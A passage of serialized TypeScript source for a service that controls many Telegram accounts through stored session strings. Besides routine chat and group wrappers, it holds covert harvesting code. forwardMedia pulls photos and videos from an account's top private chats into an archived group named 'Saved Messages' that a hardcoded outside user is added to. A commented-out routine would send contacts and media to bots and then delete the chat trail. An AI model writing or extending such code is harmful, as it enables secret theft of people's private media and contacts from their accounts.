result\n        let groupId: string | undefined;\n        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {\n            // For most cases, the created group/channel will be the last chat in the array\n            const chat = result.chats[result.chats.length - 1];\n            groupId = chat.id?.toString();\n        }\n        this.logger.logOperation(mobile, 'Group created', { id: groupId });\n        return result;\n    }\n\n    async updateGroupSettings(\n        mobile: string,\n        settings: {\n            groupId: string;\n            username?: string;\n            title?: string;\n            description?: string;\n            slowMode?: number;\n            memberRestrictions?: any;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updateGroupSettings(settings)\n    }\n\n    // Message Scheduling\n    async scheduleMessage(mobile: string, options: MessageScheduleOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.scheduleMessageSend({\n            chatId: options.chatId,\n            message: options.message,\n            scheduledTime: options.scheduledTime,\n            replyTo: options.replyTo,\n            silent: options.silent\n        });\n    }\n\n    async getScheduledMessages(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getScheduledMessages(chatId)\n    }\n\n    async sendMediaAlbum(mobile: string, album: MediaAlbumOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMediaAlbum(album)\n    }\n\n    async sendMessage(mobile: string, params: { peer: string, parseMode?: string, message: string }) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMessage(params)\n    }\n\n    async sendVoiceMessage(\n        mobile: string,\n        voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendVoiceMessage(voice)\n    }\n\n    async cleanupChat(\n        mobile: string,\n        cleanup: {\n            chatId: string;\n            beforeDate?: Date;\n            onlyMedia?: boolean;\n            excludePinned?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.cleanupChat(cleanup)\n    }\n\n    async getChatStatistics(mobile: string, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getChatStatistics(chatId, period)\n    }\n\n    // Enhanced Privacy Features\n    async updatePrivacyBatch(\n        mobile: string,\n        settings: {\n            phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n            lastSeen?: 'everybody' | 'contacts' | 'nobody';\n            profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n            forwards?: 'everybody' | 'contacts' | 'nobody';\n            calls?: 'everybody' | 'contacts' | 'nobody';\n            groups?: 'everybody' | 'contacts' | 'nobody';\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updatePrivacyBatch(settings)\n    }\n\n    async addGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.addGroupMembers(groupId, members)\n    }\n\n    async removeGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.removeGroupMembers(groupId, members)\n    }\n\n    async promoteToAdmin(\n        mobile: string,\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank)\n    }\n\n    async demoteAdmin(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Demoted admin to regular member', { groupId, userId });\n        return await telegramClient.demoteAdmin(groupId, userId);\n    }\n\n    async unblockGroupUser(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Unblocked user in group', { groupId, userId });\n        return await telegramClient.unblockGroupUser(groupId, userId);\n    }\n\n    async getGroupAdmins(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get group admins', { groupId });\n        return await telegramClient.getGroupAdmins(groupId);\n    }\n\n    async getGroupBannedUsers(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get group banned users', { groupId });\n        return await telegramClient.getGroupBannedUsers(groupId);\n    }\n\n    async searchMessages(\n        mobile: string,\n        params: SearchMessagesDto\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Search messages', params);\n        return await telegramClient.searchMessages(params);\n    }\n\n    async getFilteredMedia(\n        mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            offset?: number;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get filtered media', params);\n        return await telegramClient.getFilteredMedia(params);\n    }\n\n    // Contact Management\n    async exportContacts(\n        mobile: string,\n        format: 'vcard' | 'csv',\n        includeBlocked: boolean = false\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Export contacts', { format, includeBlocked });\n        return await telegramClient.exportContacts(format, includeBlocked);\n    }\n\n    async importContacts(\n        mobile: string,\n        contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Import contacts', { contactCount: contacts.length });\n        return await telegramClient.importContacts(contacts);\n    }\n\n    async manageBlockList(\n        mobile: string,\n        userIds: string[],\n        block: boolean\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, block ? 'Block users' : 'Unblock users', { userIds });\n        return await telegramClient.manageBlockList(userIds, block);\n    }\n\n    async getContactStatistics(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get contact statistics');\n        return await telegramClient.getContactStatistics();\n    }\n\n    // Chat Folder Management\n    async createChatFolder(\n        mobile: string,\n        options: {\n            name: string;\n            includedChats: string[];\n            excludedChats?: string[];\n            includeContacts?: boolean;\n            includeNonContacts?: boolean;\n            includeGroups?: boolean;\n            includeBroadcasts?: boolean;\n            includeBots?: boolean;\n            excludeMuted?: boolean;\n            excludeRead?: boolean;\n            excludeArchived?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Create chat folder', { name: options.name });\n        return await telegramClient.createChatFolder(options);\n    }\n\n    async getChatFolders(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get chat folders');\n        return await telegramClient.getChatFolders();\n    }\n\n    // Session Management\n    async getSessionInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get session info');\n        return await telegramClient.getSessionInfo();\n    }\n\n    async terminateSession(\n        mobile: string,\n        options: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Terminate session', options);\n        return await telegramClient.terminateSession(options);\n    }\n\n    // Message Management\n    async editMessage(\n        mobile: string,\n        options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });\n        return await telegramClient.editMessage(options);\n    }\n\n    // Chat Management\n    async updateChatSettings(\n        mobile: string,\n        settings: {\n            chatId: string;\n            username?: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n        if (!settings.chatId) {\n            throw new Error('chatId is required');\n        }\n\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Update chat settings', { chatId: settings.chatId });\n        return await telegramClient.updateChatSettings(settings);\n    }\n\n    // Media Handling\n    async sendMediaBatch(\n        mobile: string,\n        options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });\n        return await telegramClient.sendMediaBatch(options);\n    }\n\n    // Password Management\n    async hasPassword(mobile: string): Promise<boolean> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Check password status');\n        return await telegramClient.hasPassword();\n    }\n\n    // Contact Management\n    async getContacts(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get contacts list');\n        return await telegramClient.getContacts();\n    }\n\n    // Extended Chat Functions\n    async getChats(\n        mobile: string,\n        options: {\n            limit?: number;\n            offsetDate?: number;\n            offsetId?: number;\n            offsetPeer?: string;\n            folderId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get chats', options);\n        return await telegramClient.getChats(options);\n    }\n\n    async getFileUrl(mobile: string, url: string, filename: string): Promise<string> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get file URL', { url, filename });\n        return await telegramClient.getFileUrl(url, filename);\n    }\n\n    async getMessageStats(\n        mobile: string,\n        options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get message statistics', options);\n        return await telegramClient.getMessageStats(options);\n    }\n\n    async sendViewOnceMedia(\n        mobile: string,\n        options: {\n            chatId: string;\n            sourceType: 'path' | 'base64' | 'binary';\n            path?: string;\n            base64Data?: string;\n            binaryData?: Buffer;\n            caption?: string;\n            filename?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });\n\n        const { sourceType, chatId, caption, filename } = options;\n        try {\n            if (sourceType === 'path') {\n                if (!options.path) throw new BadRequestException('Path is required when sourceType is url');\n\n                try {\n                    const localPath = options.path;\n                    if (!fs.existsSync(localPath)) {\n                        throw new BadRequestException(`File not found at path: ${localPath}`);\n                    }\n                    let isVideo = false;\n                    const ext = path.extname(localPath).toLowerCase().substring(1);\n                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n\n                    const fileBuffer = fs.readFileSync(localPath);\n\n                    this.logger.logOperation(mobile, 'Sending view once media from local file', {\n                        path: localPath,\n                        isVideo,\n                        size: fileBuffer.length,\n                        filename: filename || path.basename(localPath)\n                    });\n\n                    return await telegramClient.sendViewOnceMedia(\n                        chatId,\n                        fileBuffer,\n                        caption,\n                        isVideo,\n                        filename || path.basename(localPath)\n                    );\n                } catch (error) {\n                    if (error instanceof BadRequestException) {\n                        throw error;\n                    }\n                    this.logger.logError(mobile, 'Failed to read local file', error);\n                    throw new BadRequestException(`Failed to read local file: ${error.message}`);\n                }\n            }\n            else if (sourceType === 'base64') {\n                if (!options.base64Data) throw new BadRequestException('Base64 data is required when sourceType is base64');\n                const base64String = options.base64Data;\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                this.logger.logOperation(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });\n                const mediaData = Buffer.from(base64String, 'base64');\n                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);\n            }\n            else if (sourceType === 'binary') {\n                if (!options.binaryData) throw new BadRequestException('Binary data is required when sourceType is binary');\n\n                this.logger.logOperation(mobile, 'Sending view once media from binary', {\n                    size: options.binaryData.length,\n                    filename: filename || 'unknown'\n                });\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);\n            }\n            else {\n                throw new BadRequestException('Invalid source type. Must be one of: url, base64, binary');\n            }\n        } catch (error) {\n            this.logger.logError(mobile, 'Failed to send view once media', error);\n            throw error;\n        }\n    }\n\n    async getTopPrivateChats(mobile: string): Promise<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get top private chats');\n        return await telegramClient.getTopPrivateChats();\n    }\n\n    async addBotsToChannel(\n        mobile: string,\n        channelIds: string[] = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, \"miscmessages\", process.env.httpFailuresChannel],\n    ) {\n        this.logger.logOperation(mobile, 'Add bots to channel', { channelIds });\n        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\n        if (botTokens.length === 0) {\n            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\n        }\n        for (const token of botTokens) {\n            try {\n                const botInfo = await this.getBotInfo(token);\n                if (botInfo) {\n                    for (const channelId of channelIds) {\n                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {\n                            changeInfo: true,\n                            postMessages: true,\n                            editMessages: true,\n                            deleteMessages: true,\n                            banUsers: true,\n                            inviteUsers: true,\n                            pinMessages: true,\n                            addAdmins: true,\n                            anonymous: true,\n                            manageCall: true\n                        });\n                    };\n                }\n            } catch (error) {\n                this.logger.logError(mobile, 'Failed to setup bot in channel', error);\n            }\n        }\n\n\n    }\n\n    async getBotInfo(token: string) {\n        try {\n            const response = await fetchWithTimeout(`https://api.telegram.org/bot${token}/getMe`);\n            if (response.data?.ok) {\n                return response.data.result;\n            }\n            throw new Error('Failed to get bot info');\n        } catch (error) {\n            throw new Error(`Failed to get bot info: ${error.message}`);\n        }\n    }\n\n    async setupBotInChannel(mobile: string, channelId: string, botId: string, botUsername: string, permissions: {\n        changeInfo?: boolean;\n        postMessages?: boolean;\n        editMessages?: boolean;\n        deleteMessages?: boolean;\n        banUsers?: boolean;\n        inviteUsers?: boolean;\n        pinMessages?: boolean;\n        addAdmins?: boolean;\n        anonymous?: boolean;\n        manageCall?: boolean;\n    }): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Setup bot in channel', { channelId, botId, botUsername });\n        try {\n            await telegramClient.joinChannel(channelId);\n        } catch (error) {\n            this.logger.logError(mobile, 'Failed to join channel', error);\n        }\n        try {\n            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);\n            this.logger.logOperation(mobile, 'Bot added to channel', { channelId, botUsername });\n            await sleep(2000);\n            this.logger.logOperation(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);\n        } catch (error) {\n            this.logger.logError(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);\n        }\n        try {\n            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);\n            console.log(`Bot ${botUsername} promoted as admin in channel ${channelId}`);\n        } catch (error) {\n            this.logger.logError(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);\n        }\n    }\n\n    async createBot(mobile: string, createBotDto: CreateBotDto) {\n        const client = await connectionManager.getClient(mobile);\n        return client.createBot(createBotDto);\n    }\n\n    // Connection Management Methods\n    async connect(mobile: string, options?: GetClientOptionsDto): Promise<void> {\n        await connectionManager.getClient(mobile, options);\n    }\n\n    async disconnect(mobile: string): Promise<void> {\n        await connectionManager.unregisterClient(mobile);\n    }\n\n    async disconnectAll(): Promise<void> {\n        await connectionManager.disconnectAll();\n    }\n\n    getConnectionStats(): ConnectionStatsDto {\n        return connectionManager.getConnectionStats();\n    }\n\n    getClientState(mobile: string): ConnectionStatusDto | undefined {\n        const state = connectionManager.getClientState(mobile);\n        return state;\n    }\n\n    getActiveConnectionCount(): number {\n        return connectionManager.getActiveConnectionCount();\n    }\n}\n","import { Api, TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { EntityLike } from 'telegram/define';\nimport { contains } from '../../utils';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport {\n    GroupOptions\n} from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { IterMessagesParams } from 'telegram/client/messages';\nimport { connectionManager } from './utils/connection-manager';\nimport { MessageMediaType, SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { generateTGConfig } from './utils/generateTGConfig';\n\ninterface MessageScheduleOptions {\n    chatId: string;\n    message: string;\n    scheduledTime: Date;\n    replyTo?: number;\n    silent?: boolean;\n    media?: {\n        type: 'photo' | 'video' | 'document';\n        url: string;\n    };\n}\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        console.log(\"Creating group:\", groupName);\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n        console.log(\"Archived chat\", id);\n        await this.archiveChat(id, accessHash);\n        const usersToAdd = [\"fuckyoubabie1\"]; // Replace with the list of usernames or user IDs\n        console.log(\"Adding users to the channel:\", usersToAdd);\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        console.log(\"Successful addition of users:\", addUsersResult);\n        return { id, accessHash };\n    }\n\n    public async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger) {\n        const folderId = 1;\n        console.log(\"Archiving chat\", id);\n        return await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n    }\n\n    private async createOrJoinChannel(channel: string) {\n        let channelId: bigInt.BigInteger;\n        let channelAccessHash: bigInt.BigInteger;\n        if (channel) {\n            try {\n                const result: any = await this.joinChannel(channel);\n                channelId = result.chats[0].id;\n                channelAccessHash = result.chats[0].accessHash;\n                console.log(\"Archived chat\", channelId);\n            } catch (error) {\n                const result = await this.createGroup();\n                channelId = result.id;\n                channelAccessHash = result.accessHash;\n                console.log(\"Created new group with ID:\", channelId);\n            }\n        } else {\n            const result = await this.createGroup();\n            channelId = result.id;\n            channelAccessHash = result.accessHash;\n            console.log(\"Created new group with ID:\", channelId);\n        }\n        await this.archiveChat(channelId, channelAccessHash);\n        return { id: channelId, accesshash: channelAccessHash }\n    }\n\n    public async forwardMedia(channel: string, fromChatId: string) {\n        let channelId;\n        try {\n            console.log(\"Forwarding media from chat to channel\", channel, fromChatId);\n            let channelAccessHash;\n            if (fromChatId) {\n                const channelDetails = await this.createOrJoinChannel(channel);\n                channelId = channelDetails.id;\n                channelAccessHash = channelDetails.accesshash;\n                await this.forwardSecretMsgs(fromChatId, channelId?.toString());\n            } else {\n                const chats = await this.getTopPrivateChats();\n                const me = await this.getMe();\n                if (chats.length > 0) {\n                    const channelDetails = await this.createOrJoinChannel(channel);\n                    channelId = channelDetails.id;\n                    channelAccessHash = channelDetails.accesshash;\n                    const finalChats = new Set(chats.map(chat => chat.chatId));\n                    finalChats.add(me.id?.toString());\n                    for (const chatId of finalChats) {\n                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });\n                        console.log(\"Forwarding messages from chat:\", chatId, \"to channel:\", channelId);\n                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);\n                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);\n                    }\n                }\n                console.log(\"Completed forwarding messages from top private chats to channel:\", channelId);\n            }\n        } catch (e) {\n            console.log(e)\n        }\n        if (channelId) {\n            await this.leaveChannels([channelId.toString()]);\n            await connectionManager.unregisterClient(this.phoneNumber);\n        }\n    }\n\n    public async forwardMediaToBot(fromChatId: string) {\n        // const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);\n        // try {\n        //     if (fromChatId) {\n        //         await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);\n        //     } else {\n        //         const chats = await this.getTopPrivateChats();\n        //         const me = await this.getMe();\n        //         const finalChats = new Set(chats.map(chat => chat.chatId));\n        //         finalChats.add(me.id?.toString());\n        //         for (const bot of bots) {\n        //             try {\n        //                 await this.client.sendMessage(bot, { message: \"Start\" });\n        //                 await sleep(1000);\n        //                 await this.client.invoke(\n        //                     new Api.folders.EditPeerFolders({\n        //                         folderPeers: [\n        //                             new Api.InputFolderPeer({\n        //                                 peer: await this.client.getInputEntity(bot),\n        //                                 folderId: 1,\n        //                             }),\n        //                         ],\n        //                     })\n        //                 );\n        //             } catch (e) {\n        //                 console.log(e)\n        //             }\n        //         }\n        //         try {\n        //             const contacts = await this.getContacts();\n        //             if ('users' in contacts && Array.isArray(contacts.users)) {\n        //                 await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.USER_WARNINGS), contacts);\n        //             } else {\n        //                 console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');\n        //             }\n        //         } catch (e) {\n        //             console.log(\"Failed To Send Contacts File\", e)\n        //         }\n        //         for (const chatId of finalChats) {\n        //             const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });\n        //             console.log(\"Media Messages: \", mediaMessages);\n        //             const uniqueMessageIds = Array.from(new Set([\n        //                 ...mediaMessages.photo.messages,\n        //                 ...mediaMessages.video.messages,\n        //                 ...mediaMessages.document.messages,\n        //                 ...mediaMessages.roundVideo.messages,\n        //                 ...mediaMessages.roundVoice.messages,\n        //                 ...mediaMessages.voice.messages,\n        //             ]));\n        //             const chunkSize = 30;\n        //             for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {\n        //                 const chunk = uniqueMessageIds.slice(i, i + chunkSize);\n        //                 const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)\n        //                 await this.client.forwardMessages(bot, {\n        //                     messages: chunk,\n        //                     fromPeer: chatId,\n        //                 });\n        //                 console.log(`Forwarded ${chunk.length} messages to bot`);\n        //             }\n        //         }\n        //     }\n        // } catch (e) {\n        //     console.log(e)\n        // }\n        // for (const bot of bots) {\n        //     const result = await this.cleanupChat({ chatId: bot, revoke: false });\n        //     await sleep(1000);\n        //     await this.deleteChat({ peer: bot, justClear: false });\n        //     console.log(\"Deleted bot chat:\", result);\n        // }\n    }\n\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        const limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n        console.log(\"Left the channel with ID:\", toChatId);\n        return;\n    }\n\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async destroy(): Promise<void> {\n        if (this.client) {\n            try {\n                await this.client?.destroy();\n                this.client._eventBuilders = [];\n                this.session?.delete();\n                this.channelArray = [];\n                await sleep(2000);\n                console.log(\"Client Destroyed: \", this.phoneNumber);\n            } catch (error) {\n                parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n            } finally {\n                if (this.client) {\n                    this.client._destroyed = true;\n                    if (this.client._sender && typeof this.client._sender.disconnect === 'function') {\n                        await this.client._sender.disconnect();\n                    }\n                    this.client = null;\n                }\n            }\n        }\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            await this.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            // console.error(`Error occurred: ${this.phoneNumber}:`, error);\n            parseError(error)\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, generateTGConfig());\n        this.client.setLogLevel(LogLevel.ERROR);\n        this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof 